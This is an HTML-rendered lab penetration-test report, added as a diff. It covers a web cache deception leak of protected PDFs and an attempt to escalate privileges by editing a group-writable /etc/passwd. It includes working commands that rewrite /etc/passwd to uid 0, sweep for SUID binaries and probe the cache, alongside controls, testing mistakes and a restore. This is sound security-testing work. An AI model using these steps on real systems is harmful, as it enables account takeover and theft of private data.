+<td>read <code>cache.js</code> first</td>
+<td>knew the key shape, the ext list, and that <code>pdf</code> was in it</td>
+<td>fuzzing <code>/x.pdf/foo.css</code> variants for an hour, per §4.4</td>
+</tr>
+<tr>
+<td>read <code>supportBot.js</code></td>
+<td>knew the victim, the trigger field, and the same-origin allowlist before sending anything</td>
+<td>building an XSS chain that was never needed</td>
+</tr>
+<tr>
+<td>static-asset positive control</td>
+<td>made every later <code>HIT</code> interpretable</td>
+<td>&quot;the PDF came back&quot; indistinguishable from &quot;the origin served it&quot;</td>
+</tr>
+<tr>
+<td>byte comparison vs the on-disk file</td>
+<td>proves the <em>content</em> is the admin's, not merely that a 200 occurred</td>
+<td>a &quot;finding&quot; that a 200 body was returned</td>
+</tr>
+<tr>
+<td><code>bot.log</code> as the victim oracle</td>
+<td>proves identity A really fetched it</td>
+<td>a claim about the future dressed as a result</td>
+</tr>
+<tr>
+<td>extract the password from the stolen PDF</td>
+<td>proves provenance</td>
+<td>a chain that quietly depended on reading the source</td>
+</tr>
+</tbody>
+</table>
+<h3 id="44-the-textbook-form-tested-and-negative">4.4 The textbook form, tested and negative</h3>
+<p>The classic cache-deception URL — non-route, static-looking suffix — <strong>does not work here</strong>, and I report it because a reader will try it first:</p>
+<pre><code>GET /account/invoices/1001.pdf/foo.css
+-&gt; HTTP/1.1 404 Not Found
+   X-Cache: MISS   X-Cache-Key: /account/invoices/1001.pdf/foo.css
+   body: {&quot;error&quot;:&quot;not found&quot;}
+</code></pre>
+<p><strong>Why, from the source:</strong> the SPA fallback at <code>index.js:55</code> is <code>app.get(/^(?!\/api\/|\/account\/invoices\/|\/internal\/|\/static\/).*/)</code> — it <strong>explicitly excludes</strong> <code>/account/invoices/</code>. And the cache stores only 2xx (<code>cache.js:149</code>), so a 404 is never stored. The lab's author closed the route-confusion variant while leaving the extension variant wide open.</p>
+<p><strong>And the entry criterion's &quot;not an application route&quot; <em>is</em> satisfiable, just uselessly so</strong> — the fallback does serve and cache a non-route:</p>
+<pre><code>GET /totally-made-up.css   -&gt; 200  X-Cache: MISS
+GET /totally-made-up.css   -&gt; 200  X-Cache: HIT  Age: 0
+</code></pre>
+<p>It serves <code>index.html</code>. Non-route, served, stored, replayed — and it discloses <strong>nothing</strong>, because the SPA shell is public. This is the honest boundary: the criterion is met, the <em>impact</em> is nil, and conflating the two would inflate this finding.</p>
+<hr />
+<h2 id="5-controls-that-held">5. Controls that held</h2>
+<p>Each with the positive control that proves the detector could have fired.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>The invoice authorisation check itself is correct</strong></td>
+<td>Tyler (a real, authenticated non-owner) requests Nina's <code>1001.pdf</code> on a <strong>flushed</strong> cache → <code>403 {&quot;error&quot;:&quot;forbidden&quot;}</code>; Tyler requests <strong>his own</strong> <code>1007.pdf</code> → <code>200 application/pdf</code></td>
+<td><strong>Held.</strong> The origin is right; the cache is the whole defect</td>
+</tr>
+<tr>
+<td><strong>Anonymous access is refused when the cache is cold</strong></td>
+<td><code>403</code> on <code>/internal/credentials-report.pdf</code> before any victim visit; <code>403</code> on <code>1007</code> after TTL expiry, twice</td>
+<td><strong>Held</strong></td>
+</tr>
+<tr>
+<td><strong>Only 2xx is stored</strong></td>
+<td><code>403</code> and <code>404</code> responses both leave <code>X-Cache: MISS</code> and are absent from <code>/api/_debug/cache/dump</code></td>
+<td><strong>Held</strong></td>
+</tr>
+<tr>
+<td><strong><code>sshd</code> refuses uid 0</strong></td>
+<td><code>PermitRootLogin no</code> + <code>AllowUsers pingu</code>; login as the uid-0 <code>pingu</code> → <code>AuthenticationException</code>, while the same password works for uid 1001</td>
+<td><strong>Held</strong> — the one control that stopped the escalation</td>
+</tr>
+<tr>
+<td><strong>No <code>sudo</code>/<code>doas</code> on the host</strong></td>
+<td><code>command -v sudo doas</code> → rc=127, absent</td>
+<td><strong>Held</strong></td>
+</tr>
+<tr>
+<td><strong>The bot rejects off-origin URLs</strong></td>
+<td><code>isSameOrigin</code> (<code>supportBot.js:86</code>) accepts only the bound host / <code>heliosbank</code> / <code>localhost</code> / <code>127.0.0.1</code>; the design comment says it avoids making the lab an SSRF gadget</td>
+<td><strong>Held</strong> (not separately attacked)</td>
+</tr>
+<tr>
+<td><strong>The <code>X-Dev-Token</code> gate fires</strong></td>
+<td>flush <strong>without</strong> the header → <code>401</code>; <strong>with</strong> it → <code>200</code></td>
+<td><strong>Held</strong></td>
+</tr>
+<tr>
+<td><strong>Product/admin APIs are not cacheable</strong></td>
+<td><code>X-Cache: BYPASS</code> on <code>/api/*</code> — no extension, so <code>isCacheablePath</code> returns false (<code>cache.js:66-68</code>)</td>
+<td><strong>Held</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The most important line in this table is the first.</strong> The authorisation logic in <code>invoices.js:38</code> is correct, and it is <em>still</em> bypassed — because a cache that ignores identity is not defeated by an authorisation check. That is the generalisable lesson: <strong>a correct access-control check and a correct access-control result are different claims, and only the second one is about the system.</strong></p>
+<hr />
+<h2 id="6-the-escalation-what-i-got-and-the-three-controls-that-stopped-the-rest">6. The escalation: what I got, and the three controls that stopped the rest</h2>
+<h3 id="61-the-description-over-promises-here--stated-explicitly">6.1 The description over-promises here — stated explicitly</h3>
+<p>The catalogue says <em>&quot;escalada de privilegios en linux mediante la edición de ficheros críticos del sistema.&quot;</em> <strong>The editing is exactly as described, and I did it. The escalation does not complete, and I did not obtain a root shell.</strong> Three controls, each measured:</p>
+<p><strong>(a) <code>sshd</code> refuses uid 0.</strong> With <code>pingu:x:0:0::[lab-home]/pingu:/bin/sh</code> written to <code>/etc/passwd</code> and the file read back confirming it, login fails:</p>
+<pre><code>ping with password 'chocolate' as the uid-0 pingu  -&gt;  AuthenticationException
+same password, uid 1001                            -&gt;  LOGIN OK uid=1001     &lt;- positive control
+</code></pre>
+<p><code>PermitRootLogin no</code> keys on <strong>uid 0</strong>, not on the name <code>root</code>, so renaming the account does not evade it. Attempting to place a hash directly in the <code>/etc/passwd</code> field (<code>UsePAM no</code> might have made that work) also failed, with the uid-1001 login as the control that the instrument was working:</p>
+<pre><code>$6$w249salt$SGYgLbnx…  in the passwd field  -&gt;  AuthenticationException
+original credential 'chocolate'              -&gt;  LOGIN OK uid=1001
+</code></pre>
+<p><strong>(b) <code>/usr/bin/passwd</code> gates on the real uid, not the euid.</strong> It is <code>-rwsr-xr-x root root</code>, so the temptation is to use it to write a shadow hash for the uid-0 account. It refuses:</p>
+<pre><code>$ echo w249rootpw | /usr/bin/passwd --stdin w249probe
+passwd: only root can use --stdin/-s option
+$ /usr/bin/passwd w249probe
+passwd: You may not view or modify password information for w249probe.
+</code></pre>
+<p><strong>(c) <code>su</code> needs the root password, which is not disclosed.</strong> <code>su -c id root</code> → <code>Password:</code> → <code>su: incorrect password</code>. <code>/etc/shadow</code> is <code>-rw-r----- root:shadow</code> and unreadable as <code>pingu</code>, so the hash cannot be cracked offline either.</p>
+<p><strong>The escalation's ceiling is therefore: authenticated shell as <code>uid=1001(pingu)</code> + arbitrary write to the account database.</strong> That is a serious, real, persistent compromise — and it is <strong>not</strong> root, and I am not going to describe it as root.</p>
+<h3 id="62-the-suid-binaries-are-present-but-yield-nothing--and-why-my-first-measurement-was-wrong">6.2 The SUID binaries are present but yield nothing — and why my first measurement was wrong</h3>
+<p><code>find / -xdev -perm -4000</code> returns eight setuid-root binaries (<code>/bin/busybox</code>, <code>/usr/bin/passwd</code>, <code>chage</code>, <code>chsh</code>, <code>chfn</code>, <code>gpasswd</code>, <code>expiry</code>, <code>chrome-sandbox</code>), <code>NoNewPrivs: 0</code>, and <code>/</code> carries <strong>no <code>nosuid</code></strong>. Every precondition for a SUID escalation is present, and it still does not work:</p>
+<pre><code>$ /bin/busybox sh -c 'id -u'
+1001
+</code></pre>
+<p><strong>My first pass at this was wrong and I am recording it, because the mistake is the reusable part.</strong> I ran <code>id</code> and read <code>uid=1001(pingu)</code> and concluded the setuid bit was inert. <code>id</code> with no arguments prints the <strong>real</strong> uid. The measurement that answers the question is <code>id -u</code>:</p>
+<pre><code>$ /bin/busybox sh -c 'echo ruid=$(id -ru) euid=$(id -u)'
+ruid=1001 euid=1001
+</code></pre>
+<p>So the euid really is 1001 — the conclusion was right and the <em>evidence</em> was not. This is the mirror image of lab 65 §1.2: there a privileged tool fabricated a finding, here a well-formed line of output nearly cost me a control. <strong><code>id</code> proves identity for the report; <code>id -u</code> proves it for the exploit.</strong> Both are needed and they are not interchangeable.</p>
+<p>I did not establish <em>why</em> busybox drops the euid (a <code>CONFIG_FEATURE_SUID</code>-absent build is the likely answer) — I tested the observable and it was negative, and I am not going to assert a build flag I did not read.</p>
+<h3 id="63-the-application-runs-as-root-and-that-is-not-exploitable-here">6.3 The application runs as root, and that is not exploitable here</h3>
+<p><code>pid 9 node dist/index.js</code> is <code>uid=0</code>. If any request-influenced value reached a code-execution sink, that would be instant root. It does not:</p>
+<pre><code>$ grep -rnE &quot;child_process|execSync|spawn|eval\(|new Function&quot; /app/server/dist
+(no matches)
+</code></pre>
+<p>No template engine, no upload handler, no deserialiser, no filesystem write driven by request data. <code>/app/server/dist</code> and <code>/app/client/dist</code> are <code>root:root 0755/0644</code> and not writable by <code>pingu</code>. The bot launches Chromium with <code>--no-sandbox</code> as root, but it only ever navigates same-origin URLs and its inputs are not attacker-controlled beyond the URL already covered in §3.3.</p>
+<p><strong>Filed as a hardening observation, not a finding of this engagement:</strong> a web application should not run as root, because it converts any future bug — including a dependency CVE — into root. I am not reporting it as a vulnerability, because I did not exploit it and there is nothing to exploit.</p>
+<hr />
+<h2 id="7-instrumentation-defects">7. Instrumentation defects</h2>
+<p>The most valuable section, per the runbook. Four, all of which produced a clean, confident, wrong answer.</p>
+<h3 id="71-find--writable-does-not-exist-in-busybox--it-reports-nothing-is-writable-and-exits-0">7.1 <code>find -writable</code> does not exist in busybox — it reports &quot;nothing is writable&quot; and exits 0</h3>
+<p>This is the worst of the four, and it would have <strong>removed my strongest privilege-escalation finding</strong>.</p>
+<pre><code>$ find /etc -maxdepth 1 -writable
+find: unrecognized: -writable
+BusyBox v1.37.0 … Usage: find [-HL] [PATH]... [OPTIONS] [ACTIONS]
+$ echo $?
+0
+</code></pre>
+<p><strong>Empty output, exit status 0, usage text on stderr.</strong> I ran it as a sweep for writable files in <code>/etc</code>, got nothing, and for a moment had a clean negative: <em>no writable critical files, no escalation surface.</em> Meanwhile <code>test -w</code> on the same file, at the same moment, said the opposite:</p>
+<pre><code>  test -w /etc/passwd        : WRITABLE
+  find -writable output: [find: unrecognized: -writable …]     &lt;- busybox, exit 0
+</code></pre>
+<p>The container is Alpine-family: <code>/usr/bin/find -&gt; /bin/busybox</code>, and busybox <code>find</code> has no <code>-writable</code> predicate. The correct busybox-compatible form is <code>-perm -0020 -o -perm -0002</code>, and <strong>its positive control is the file I was hunting for</strong>:</p>
+<pre><code>$ find /etc -xdev \( -perm -0020 -o -perm -0002 \)
+/etc/passwd          &lt;- the answer, in the first two lines
+/etc/os-release
+…
+</code></pre>
+<p><strong>The rule, and it generalises past busybox:</strong> <em>a filesystem-permission sweep is a detector, and an unsupported predicate is a silent negative.</em> The tell is the shape of the output — a usage message and exit 0 reads exactly like &quot;nothing matched.&quot; Any permission enumeration must be <strong>validated against a file already known to be writable</strong>, and its stderr must not be discarded. <code>2&gt;/dev/null</code>, which I habitually write, hides the only evidence that would have caught this.</p>
+<p>This is the same class as the runbook's &quot;a check that fails with <em>command not found</em> is untested, not a negative&quot; — and busybox's <code>find</code> is strictly worse than <em>command not found</em>, because it <strong>exits 0</strong>.</p>
+<h3 id="72-ls--l-column-confusion-nearly-made-me-report-a-777-etcpasswd">7.2 <code>ls -l</code> column confusion nearly made me report a 777 <code>/etc/passwd</code></h3>
+<pre><code>-rw-rw-r--    1 root     pinguinos       777 May 23 09:02 /etc/passwd
+                              ^^^^^^^^       ^^^
+                              the mode       THE SIZE
+</code></pre>
+<p>I read <code>777</code> as the mode and wrote &quot;world-writable <code>/etc/passwd</code>&quot; into my notes before catching it. The mode is <strong><code>664 root:pinguinos</code></strong> — group-writable, and <code>pingu</code> is in that group, so the finding survives — but the <em>stated</em> mechanism was wrong, and &quot;world-writable&quot; would have been a materially different and more alarming claim than &quot;group-writable by a service group.&quot;</p>
+<p><strong>Use <code>stat -c '%a %A %U:%G'</code>, which puts each field in a named slot.</strong> <code>ls -l</code> mixes a 9-character mode string with a size column in the same visual field, and a three-digit size looks exactly like a three-digit octal mode.</p>
+<h3 id="73-sed--i-cannot-edit-a-writable-file-in-an-unwritable-directory">7.3 <code>sed -i</code> cannot edit a writable file in an unwritable directory</h3>
+<pre><code>$ sed -i 's/^pingu:.*/pingu:x:0:0:/' /etc/passwd
+sed: can't create temp file '/etc/passwdXXXXXX': Permission denied
+</code></pre>
+<p><code>sed -i</code> writes a <strong>new file in the same directory</strong> and renames over the target. <code>/etc</code> is <code>root:root 0755</code>, so the <em>directory</em> is not writable even though the <em>file</em> is. The write was always possible; only the tool was unsuitable:</p>
+<pre><code>$ sed 's/^pingu:.*/pingu:x:0:0:/' /etc/passwd &gt; /tmp/pw &amp;&amp; cat /tmp/pw &gt; /etc/passwd   # SUCCESS
+</code></pre>
+<p>A &quot;Permission denied&quot; from an in-place editor is <strong>not</strong> evidence that a file is unwritable. It is evidence about the <em>directory</em>. <code>&gt;&gt;</code> and <code>&gt;</code> both worked throughout, which is the differential that distinguishes the two.</p>
+<h3 id="74-cp-failed-silently-in-the-same-situation--and-nearly-left-my-artefact-in-place">7.4 <code>cp</code> failed silently in the same situation — and nearly left my artefact in place</h3>
+<pre><code>$ cp /tmp/passwd.bak /etc/passwd
+cp: can't create '/etc/passwd': File exists
+$ grep -c w249canary /etc/passwd
+1                                     &lt;- the canary is STILL THERE
+</code></pre>
+<p>The same class as 7.3, but the consequence is worse: this was a <strong>cleanup</strong> command, and it reported an error I read past, so my canary survived into the next test. Caught only because I re-read the file afterwards. Cleanup that reports an error must be verified by <strong>re-reading the state</strong>, not by the absence of an error message.</p>
+<p>The working method, and the one that left the file byte-correct:</p>
+<pre><code>$ grep -v w249canary /etc/passwd &gt; /tmp/p.clean &amp;&amp; cat /tmp/p.clean &gt; /etc/passwd
+$ grep -c w249canary /etc/passwd
+0
+</code></pre>
+<h3 id="75-checked-and-not-defective--recorded-so-the-next-worker-does-not-re-chase-it">7.5 Checked and <em>not</em> defective — recorded so the next worker does not re-chase it</h3>
+<ul>
+<li>
+<p><strong><code>rtk curl -H</code> header transmission works here.</strong> The brief warns it can silently drop <code>-H</code>. Tested in both directions, because a positive-only test cannot detect a drop:</p>
+<pre><code>POST /api/_debug/cache/flush   with    -H 'X-Dev-Token: lab-dev-flush'  -&gt;  200
+POST /api/_debug/cache/flush   without -H                              -&gt;  401
+plain curl with -H                                                    -&gt;  200
+</code></pre>
+<p>The 401 is the control: the endpoint <em>can</em> reject a missing header, so the 200s mean the header arrived. This defect did not manifest in this engagement.</p>
+</li>
+<li>
+<p><strong><code>curl -b</code> without <code>-c</code>.</strong> Not exercised — I passed tokens explicitly as <code>Cookie:</code> headers and captured the body with <code>-o</code>, so no cookie-jar round-trip was ever needed. I did not rely on it, which is the only safe response to a known defect.</p>
+</li>
+<li>
+<p><strong>No <code>nmap -sU</code>.</strong> Untested, declared as a gap in §1.1, not reported as a closed port.</p>
+</li>
+</ul>
+<hr />
+<h2 id="8-not-tested-vs-discarded-with-reason">8. NOT tested vs discarded with reason</h2>
+<p><strong>NOT tested (honest coverage gaps):</strong></p>
+<ul>
+<li><strong>UDP.</strong> <code>nmap -sU</code> needs root, unavailable on this host. Mitigated by empty <code>/proc/net/udp{,6}</code>, a two-process entrypoint, and <code>ExposedPorts</code> agreeing with the TCP scan — corroboration, not closure.</li>
+<li><strong>A forged admin JWT</strong> (<code>auth.js:12</code>). Deliberately not exercised, to keep §3.1's chain uncontaminated by a second bug. The finding is filed from source plus the verified-absent env var (§3.6); the <em>impact</em> is therefore argued, not demonstrated, and is labelled as such.</li>
+<li><strong>Real browser execution of the bot's navigation.</strong> I have the server's own <code>bot.log</code> line and the resulting cache entry, which is the oracle; I did not drive a headless browser to watch the admin's session make the request.</li>
+<li><strong>Why busybox drops the euid</strong> (§6.2). The observable is measured and negative; the mechanism is a plausible build-flag guess I did not verify.</li>
+<li><strong>Post-compromise persistence and exfiltration.</strong> I made no change beyond the writes I reverted, and did not modify anything under <code>labs/</code>.</li>
+<li><strong>Whether a second host exists.</strong> <code>auto_deploy.sh</code> declares one container and no extra networks; I did not go looking.</li>
+</ul>
+<p><strong>Discarded with reason (tested or read, then ruled out):</strong></p>
+<ul>
+<li><strong>The textbook path-confusion URL</strong> <code>/account/invoices/1001.pdf/foo.css</code> — <strong>tested, 404.</strong> <code>index.js:55</code> excludes <code>/account/invoices/</code> from the SPA fallback and 404s are not stored (<code>cache.js:149</code>). §4.4.</li>
+<li><strong>A non-route URL with a cacheable extension as the attack</strong> — <strong>tested, works, and discloses nothing.</strong> <code>/totally-made-up.css</code> is served and cached, and returns the public <code>index.html</code>. The entry criterion is satisfied with zero impact; conflating the two would inflate the finding. §4.4.</li>
+<li><strong>Hash in the <code>/etc/passwd</code> field under <code>UsePAM no</code></strong> — tested, <code>AuthenticationException</code>, with a working-login control. §6.1(a).</li>
+<li><strong><code>passwd</code>/<code>su</code> to finish the escalation</strong> — tested, both refuse. §6.1(b), §6.1(c).</li>
+<li><strong><code>sed -i</code> as a write method</strong> — abandoned on measurement once I established the directory-vs-file distinction. §7.3.</li>
+<li><strong>Reporting &quot;no privilege escalation&quot;</strong> — <strong>rejected.</strong> The group-writable account database <em>is</em> an escalation primitive, and I wrote to it and read the write back. What I declined to claim is the root shell I did not get. The two are filed as one finding with two severities, not merged.</li>
+</ul>
+<hr />
+<h2 id="9-what-this-lab-adds-to-the-methodology">9. What this lab adds to the methodology</h2>
+<ol>
+<li><strong>Web cache deception, first evidence — and the entry criterion needs a companion question.</strong> The brief's criterion (a <em>non-route</em> URL served by the app) is the textbook form, and it is <strong>refuted here</strong>: the classic <code>/x.pdf/foo.css</code> 404s. What this lab proves is the broader and more dangerous form — <strong>a genuine dynamic route, carrying a cacheable extension, is cached anyway.</strong> So the criterion needs its second half stated as the primary test: <em>is the cache's notion of &quot;same resource&quot; coarser than the origin's, and does the response vary by identity?</em> Ask that first and you find this lab; ask only the route-confusion question and you conclude, correctly but uselessly, that the target is not vulnerable.</li>
+<li><strong>Prove the cache stores before you believe any miss — and the control is a public asset.</strong> A <code>HIT</code> on a sensitive URL is uninterpretable until a <em>public</em> URL has been shown to <code>MISS</code>→<code>HIT</code> under the same middleware. The static product image was that control, and it costs one request.</li>
+<li><strong>The cross-identity comparison is the finding, and it must be in bytes.</strong> Status code and <code>X-Cache: HIT</code> are consistent with an origin that simply served the request. The claim that carries weight is an <strong>md5 against the protected artefact measured in-container</strong> — plus the same md5 from three different requesters, which is what demonstrates the identity is <em>irrelevant</em> rather than merely absent.</li>
+<li><strong>A correct access-control check is not a correct access-control result.</strong> <code>invoices.js:38</code> is correct and is still bypassed, because a cache that ignores identity is not constrained by an authorisation check. The control table must therefore distinguish <em>the check exists and is right</em> from <em>the check held</em>, and only the second is a claim about the system.</li>
+<li><strong>The extension list is the vulnerability surface, and it should be read before the first request.</strong> <code>pdf</code> being in <code>CACHEABLE_EXT</code> (<code>cache.js:44</code>) predicted the entire attack. The lab's own comment at <code>:23-26</code> names the textbook form; the two <em>routes</em> that leak are the ones whose names end in a listed extension. <strong>Enumerate the sensitive routes, take their suffixes, and intersect with the cacheable list</strong> — that intersection is the finding, and it is computable from two files.</li>
+<li><strong><code>Cache-Control: private, no-store</code> is a request, not a control.</strong> Both routes set it and both are cached. An origin directive is only honoured by a cache that agrees to honour it, and a cache is a different administrative domain from the origin by definition. <strong>Never treat an origin header as a mitigation</strong>; test the return path, as §3.1 does.</li>
+<li><strong>The lab's own description is evidence, and it can over-promise.</strong> All three clauses are <em>about</em> real mechanisms, and the third — &quot;escalada de privilegios&quot; — is a real primitive that does not complete. The correct handling is the lab-65 §3.8 one: <strong>file the primitive and the ceiling separately</strong>, name the controls that produced the ceiling, and say plainly that the root shell was not obtained. A description promising escalation that stops at <code>uid=1001</code> is a description to correct, not a chain to finish by assertion.</li>
+<li><strong><code>id</code> is not <code>id -u</code>.</strong> Adding to the execution-identity rule: <code>id</code> reports the <strong>real</strong> uid, and a SUID escalation is precisely a divergence between real and effective. Every SUID claim in this corpus must carry <code>id -u</code>, and the control that proves the detector works is the <em>same login succeeding</em> at the ordinary uid — as §6.1(a) and §6.2 do.</li>
+<li><strong>An unsupported predicate that exits 0 is worse than &quot;command not found.&quot;</strong> Busybox <code>find -writable</code> printed usage, returned nothing, and exited 0 — a false negative that would have deleted this engagement's best finding. Generalises the runbook's rule: <strong>a check that fails loudly is untested; a check that fails quietly while reporting success is worse than untested, because it is indistinguishable from a result.</strong> Every permission enumeration gets a positive control against a file already known to be writable, and stderr is never discarded.</li>
+<li><strong>Editing a writable file in an unwritable directory is a <em>directory</em> fact, not a <em>file</em> fact.</strong> <code>sed -i</code> failing on a group-writable <code>/etc/passwd</code> looks exactly like the file being read-only. The differential (<code>&gt;&gt;</code> works, <code>sed -i</code> does not) is the whole diagnosis — and it is the reason the group-write finding survived at all.</li>
+</ol>
+<hr />
+<h2 id="10-restore">10. Restore</h2>
+<p>Recreated from the image, not by undoing edits:</p>
+<pre><code class="language-bash">docker rm -f adopting_container
+docker run -d --name adopting_container adopting:latest
+</code></pre>
+<p><strong>Verified positively</strong>, not by the absence of an error:</p>
+<pre><code>IP=[net-0-5]
+$ md5sum /etc/passwd
+30d8e4ac1e77ef2357d4e3200295579e        &lt;- byte-identical to the pre-test value
+$ grep -cE &quot;w249|canary|probe&quot; /etc/passwd
+0                                        &lt;- no canaries from any of my probes
+$ ls -la /tmp/
+total 8                                    &lt;- empty; nothing of mine left
+drwxrwxrwt 2 root root 4096 Apr 15 04:51 .
+drwxr-xr-x 1 root root 4096 Sep 30 00:10 ..
+
+$ curl -o /dev/null -w '%{http_code}' http://[net-0-5]:2300/api/products
+200                                        &lt;- service answering again
+
+$ curl -D - http://[net-0-5]:2300/internal/credentials-report.pdf
+HTTP/1.1 403 Forbidden
+X-Cache: MISS                              &lt;- cache cold: the disclosure is GONE
+</code></pre>
+<p>That last line is the restore's positive control and it is the one that matters: the container is not merely <em>running</em>, it is <strong>back to the state where the exploit does not work</strong>. A restore that only proves &quot;HTTP 200 somewhere&quot; would have passed while leaving the cache warm.</p>
+<p>I left the image in place (needed for the restore) and removed nothing under <code>labs/</code>. Nothing in <code>/tmp</code> inside or outside the container is mine to delete beyond confirming it is empty.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
